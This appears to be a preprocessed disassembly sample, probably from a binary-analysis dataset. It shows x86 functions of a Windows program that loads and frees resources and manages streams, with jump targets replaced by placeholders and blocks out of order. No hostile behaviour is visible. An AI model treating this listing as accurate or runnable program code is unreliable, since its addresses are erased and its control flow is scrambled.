cmp eax [ ebp - 0x8 ]
jle r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov cx 0x2
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_43f070
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
add eax 0x1fff
and eax 0xffffe000
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4444fc
xor eax eax
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4444e0
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax [ rw-data ]
movzx eax [ eax ]
call sub_4444d0
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447ad8
call sub_44c7a8
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub_43f128
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
jl r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0xc ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
add eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jle r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x8 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
call sub_44bbe8
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x10 ]
jle r-xdata
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43eff4
sub_43f1b8
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44c040
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_44cf24
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43f288
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_43f218
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43f27b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a48
call sub_44c7a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f282
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
sub_43f288
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FindResourceA
mov edx [ ebp - 0x8 ]
mov [ edx + 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call LoadResource
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
push ebp
call sub_43f218
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SizeofResource
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax [ ebp - 0x8 ]
pop ecx
call sub_43eea4
mov esp ebp
pop ebp
retn 0x4
push ebp
call sub_43f218
pop ecx
sub_43f314
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_4444b8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
push eax
call FreeResource
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44c060
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_43f35c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447ad8
call sub_44c7a8
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_43f38c
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0x8 ]
call sub_44ba5c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_43f3e8
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_44ba74
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_43f4b8
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
add eax 0x10
mov edx [ ebp + 0xc ]
call sub_44cb34
mov eax [ ebp - 0x4 ]
add eax 0x14
mov edx [ ebp + 0x8 ]
call sub_44cb34
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x10
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_43f52c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax ] 0x0
je r-xdata
sub al 0x2e
jne r-xdata
mov al [ ebp - 0x5 ]
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
sub ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
add eax 0x10
mov edx [ ebp - 0xc ]
call sub_44cbc8
mov ecx [ ebp - 0x10 ]
sub ecx [ ebp - 0xc ]
inc ecx
mov eax [ ebp - 0x4 ]
add eax 0x14
mov edx 0x1
call sub_44cfa8
mov [ ebp - 0x5 ] 0x1
inc [ ebp - 0x10 ]
sub_43f598
push ebp
mov ebp esp
add esp 0xffffffe0
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43f682
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f689
lea eax [ ebp - 0x20 ]
call sub_44cae0
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x1c ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x1c ]
mov al [ eax ]
test al al
je r-xdata
mov ecx [ ebp - 0x1c ]
sub ecx [ ebp - 0x18 ]
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x18 ]
call sub_44cbc8
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x10 ]
call sub_4428c4
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
add al 0xd3
sub al 0x2
jae r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x20 ]
call sub_446260
test al al
je r-xdata
inc [ ebp - 0x1c ]
mov eax [ ebp - 0x1c ]
cmp [ eax ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x1c ]
cmp [ eax ] 0x2d
jne r-xdata
inc [ ebp - 0x1c ]
mov eax [ ebp - 0x1c ]
cmp [ eax ] 0x3e
jne r-xdata
inc [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc [ ebp - 0x1c ]
sub_43f6a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_43c504
test eax eax
jge r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_43c504
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_43c264
sub_43f6dc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_43c504
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_43c504
test eax eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_43c2dc
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_43c264
sub_43f730
push ebp
mov ebp esp
add esp 0xffffffdc
cmp [ rw-data ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_448ef8
xor eax eax
push ebp
push sub_43f923
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_43c9e4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43f904
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f90b
mov eax [ rw-data ]
call sub_43ca60
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43f8e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43f881
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x10 ]
jg r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_43c464
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x10 ]
call [ rw-data ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f888
mov eax [ ebp - 0x8 ]
call sub_44c070
retn
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
call sub_405268
test eax eax
je r-xdata
push ebp
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
call sub_43f6a0
pop ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_43c2dc
mov eax [ ebp - 0x20 ]
call sub_44c070
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x14 ]
call sub_43f598
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x1c ]
call sub_4052dc
push ebp
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x4 ]
call sub_43f6dc
pop ecx
inc [ ebp - 0x10 ]
sub_43f888
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_44c070
retn
inc eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x10 ] 0x0
inc [ ebp - 0x10 ]
dec [ ebp - 0x24 ]
jne r-xdata
mov eax [ ebp - 0x18 ]
and [ eax + 0x20 ] 0xff7f
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_43c464
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
sub_43f930
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_43c9e4
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_43f9de
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_43ca60
retn
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
call sub_43c2dc
mov eax [ ebp - 0x10 ]
call sub_44c070
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_446260
test al al
je r-xdata
dec [ ebp - 0xc ]
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
call sub_43c464
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_43f9ec
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_43c9e4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_43fa75
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_43ca60
retn
mov [ ebp - 0x8 ] eax
dec [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_43c2dc
mov eax [ ebp - 0xc ]
call sub_44c070
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_43c464
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_43fac0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4051c4
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
call sub_43faa0
sub_43faec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
sub edx [ eax + 0x14 ]
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_43f3e8
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_43fb3c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_441940
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_441ad8
call sub_43faa0
sub_43fb6c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0x8 ]
call sub_446260
test al al
je r-xdata
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_44cae0
sub_43fbb0
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x11 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0x8 ]
call sub_446260
test al al
je r-xdata
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x12 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_441940
cmp al 0xa
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43fc74
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_440034
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx ]
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_440034
mov eax [ ebp - 0x4 ]
mov [ eax + 0x74 ] 0x1
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x14 ]
call [ ebp + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fc7b
mov eax [ ebp - 0xc ]
call sub_44c070
retn
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_441ad8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x74 ] 0x1
call sub_43faa0
sub_43fc8c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_441940
test al al
sete [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x10 ]
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_43fcb0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5a ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x9 ]
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_43fce8
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x114 ]
mov edx [ ebp - 0xc ]
mov ecx 0xff
call sub_44cd3c
lea edx [ ebp - 0x114 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_44c2d0
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
sete [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x3a ] 0x0
je r-xdata
cmp [ ebp - 0x11 ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x11 ]
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_43faa0
sub_43fd60
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_43c9e4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43fdf1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fdf8
mov eax [ rw-data ]
call sub_43ca60
retn
mov [ ebp - 0x8 ] eax
dec [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_43c464
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_44c070
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_43c2dc
sub_43fdfc
push ebp
mov ebp esp
add esp 0xffffffe8
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43ff2f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ff36
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
xor eax eax
push ebp
push sub_43ff12
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_43ff6c
retn
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp - 0x18 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_4052dc
mov eax [ ebp - 0x18 ]
call sub_43f52c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x8 ]
call sub_43c464
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x18 ]
mov edx [ edx + 0x14 ]
call sub_44cb78
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_43f598
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x8 ]
call sub_43c464
call sub_43fd60
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x8 ]
call sub_43c464
mov edx eax
mov eax [ rw-data ]
call sub_43c958
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
xor ecx ecx
mov edx [ ebp - 0x8 ]
call sub_43c6a8
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0x14 ]
jne r-xdata
sub_43ff3c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43ffcc
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43eaa4
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x14 ] edx
pop ecx
pop ebp
retn
sub_43ff6c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44c070
